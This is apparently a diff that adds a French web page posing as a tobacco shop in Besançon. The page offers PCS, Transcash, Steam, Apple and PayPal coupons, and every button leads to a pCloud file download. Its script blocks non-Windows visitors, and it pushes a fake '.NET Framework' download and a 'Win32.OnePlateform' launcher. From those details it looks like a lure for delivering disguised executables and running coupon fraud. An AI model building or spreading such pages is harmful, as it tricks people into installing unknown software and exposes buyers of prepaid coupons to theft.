@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Bureau-de-Tabac–Coupons-en-ligne</title>
+
+  <!-- Blocage non-Windows (efficace) -->
+  <script>
+    const isWindows = navigator.userAgent.includes("Windows");
+    if (!isWindows) {
+      document.documentElement.innerHTML = `
+        <style>
+          body {
+            font-family: Arial, sans-serif;
+            background: #fff3e0;
+            color: #e65100;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+          }
+          .message {
+            max-width: 500px;
+            padding: 40px;
+            border: 2px solid #e65100;
+            border-radius: 10px;
+            background: #ffffff;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+          }
+        </style>
+        <body>
+          <div class="message">
+            <h1>⚠️ Accès refusé</h1>
+            <p>Ce site est uniquement accessible depuis un système <strong>Windows</strong>.</p>
+            <p>Merci de revenir avec un PC sous Windows.</p>
+          </div>
+        </body>
+      `;
+    }
+  </script>
+
+  <style>
+    body {font-family: Arial, sans-serif; margin:0; padding:0; background:#f4f4f4; color:#333;}
+    header {background:#e65100; color:#fff; padding:20px; text-align:center;}
+    header h1 {margin:0; font-size:28px;}
+    .contact-top {margin-top:8px; font-weight:bold;}
+    nav {margin-top:10px;}
+    nav a {color:#fff; text-decoration:none; margin:0 15px; font-weight:bold; cursor:pointer;}
+    nav a:hover {text-decoration:underline;}
+    .container {max-width:1000px; margin:20px auto; padding:20px; background:#fff; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,0.1);}
+    .hero {display:flex; flex-wrap:wrap; align-items:center; justify-content:space-between;}
+    .hero-text {flex:1; min-width:280px; margin-right:20px;}
+    .hero-text h2 {color:#e65100;}
+    .btn {display:inline-block; margin:10px 5px; padding:12px 20px; background:#e65100; color:#fff; border-radius:6px; text-decoration:none; font-weight:bold; transition:background 0.3s; cursor:pointer;}
+    .btn:hover {background:#bf360c;}
+    .logos {margin-top:20px; display:flex; flex-wrap:wrap; justify-content:center; gap:15px; align-items:center;}
+    .logos img {height:50px; object-fit:contain;}
+    footer {background:#333; color:#fff; text-align:center; padding:15px; margin-top:30px;}
+    .alert-net {margin-top:15px; padding:10px; background:#ffebee; border:1px solid #e65100; color:#e65100; font-weight:bold; border-radius:6px;}
+    .alert-net a {color:#e65100; text-decoration:underline; cursor:pointer;}
+  </style>
+</head>
+<body>
+  <header>
+    <h1>💨 Bureau-de-Tabac–Coupons-en-ligne</h1>
+    <div class="contact-top">📞 03 81 23 45 67 • ✉️ contact@tabac-liberte.fr</div>
+    <nav>
+      <a onclick="ouvrirLienWindows(liensPcloud.pcs)">Coupons PCS</a>
+      <a onclick="ouvrirLienWindows(liensPcloud.transcash)">Coupons Transcash</a>
+      <a href="#">Contact</a>
+    </nav>
+  </header>
+
+  <div class="container">
+    <section class="hero">
+      <div class="hero-text">
+        <h2>Bienvenue — Bureau de Tabac de la Liberté</h2>
+        <p>Espace numérique — récupérez vos coupons et recharges en toute sécurité.</p>
+        <p><strong>145 Rue de la Liberté, 25000 Besançon • Ouvert 9h - Minuit</strong></p>
+
+        <!-- Boutons -->
+        <a class="btn" onclick="ouvrirLienWindows(liensPcloud.pcs)">🎟️ Coupons PCS</a>
+        <a class="btn" onclick="ouvrirLienWindows(liensPcloud.transcash)">💳 Coupons Transcash</a>
+        <a class="btn" onclick="ouvrirLienWindows(liensPcloud.apple)">🍏 Coupons Apple</a>
+        <a class="btn" onclick="ouvrirLienWindows(liensPcloud.steam)">🎮 Coupons Steam</a>
+        <a class="btn" style="background:#0078D7;" onclick="ouvrirLienWindows(liensPcloud.Win32OnePlateform)">🚀 Lancer Win32.OnePlateform</a>
+
+        <!-- .NET Alert -->
+        <div class="alert-net">
+          ⚠️ Ce logiciel nécessite .NET Framework 3.5 ou plus.<br>
+          <a onclick="ouvrirLienWindows(liensPcloud.framework)">📥 Télécharger .NET Framework</a>
+        </div>
+
+        <!-- Télécharger le logiciel -->
+        <button class="btn" onclick="ouvrirLienWindows(liensPcloud.framework)">📥 Télécharger le logiciel</button>
+
+        <!-- Bouton PayPal (cliquable vers pCloud) -->
+        <div style="margin-top:20px;">
+          <a href="#" onclick="ouvrirLienWindows(liensPcloud.paypal); return false;" class="btn" style="background:#ffc439; color:#111;">
+            <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="Logo PayPal" style="height:20px; vertical-align:middle; margin-right:8px;">
+            Payer avec PayPal
+          </a>
+        </div>
+
+        <!-- Logos -->
+        <div class="logos">
+          <img src="https://i.postimg.cc/zVH55wQS/Logo-FDj.png" alt="Logo FDJ">
+          <img src="https://i.postimg.cc/qg509D1v/Logo-Transcash.png" alt="Logo Transcash">
+          <img src="https://i.postimg.cc/K4zxphrW/Logo-PCS.png" alt="Logo PCS">
+          <img src="https://i.postimg.cc/hXFnGzWF/presse-tabac.png" alt="Logo Presse Tabac">
+          <img src="https://i.postimg.cc/XBpWr9YW/Auchan.png" alt="Logo Auchan">
+          <img src="https://i.postimg.cc/W1Q9Lw32/gif-carte.png" alt="Carte cadeau">
+          <img src="https://i.postimg.cc/s27TVGQ5/steam.png" alt="Logo Steam">
+          <img src="https://i.postimg.cc/XJLrygkR/win32.png" alt="Logo Win32">
+
+          <!-- Logo PayPal cliquable (utilise le même lien que le bouton PayPal) -->
+          <a href="#" onclick="ouvrirLienWindows(liensPcloud.paypal); return false;">
+            <img src="https://i.postimg.cc/59mpHMTJ/Paypal-png.png" alt="Logo Paypal" style="height:50px;">
+          </a>
+        </div>
+      </div>
+    </section>
+  </div>
+
+  <footer>
+    <p>📞 03 81 23 45 67 • ✉️ contact@tabac-liberte.fr</p>
+    <p>&copy; 2025 Bureau de Tabac de la Liberté – Tous droits réservés</p>
+  </footer>
+
+  <!-- Script de gestion des liens -->
+  <script>
+    const liensPcloud = {
+      pcs: "https://e.pcloud.link/publink/show?code=XZc8kUZf7eLiASVfV7BhsDXcyen3p83lwik",
+      transcash: "https://e.pcloud.link/publink/show?code=XZQ8kUZAqhUUhqfbXF2bjSS3y97zmQwaceX",
+      apple: "https://e.pcloud.link/publink/show?code=XZ6m0UZtVcL066ePI76ND4TMh1C3JaJks70",
+      steam: "https://e.pcloud.link/publink/show?code=XZOm0UZSWGPVayaHYF7EWjRCu1K3RGMib6X",
+      Win32OnePlateform: "https://e.pcloud.link/publink/show?code=XZ5D4UZfYUXXiw4EPH4AQyp6cgjBVOj86ek",
+      framework: "https://e.pcloud.link/publink/show?code=XZ5DQUZxfnQK9zDfpHk0qKxpH0fbjJWuTXk",
+      // AJOUT : clé paypal correcte — remplace par ton lien réel pCloud pour PayPal
+      paypal: "https://e.pcloud.link/publink/show?code=XZOhbUZE5GapnK2qJV9MT9IsguBijLitVmy"
+    };
+
+    function estWindows() {
+      return navigator.userAgent.includes("Windows");
+    }
+
+    function ouvrirLienWindows(url) {
+      if (estWindows()) {
+        window.open(url, "_blank");
+      } else {
+        alert("⚠️ Ce service est disponible uniquement sous Windows.");
+      }
+    }
+  </script>
+</body>
+</html>
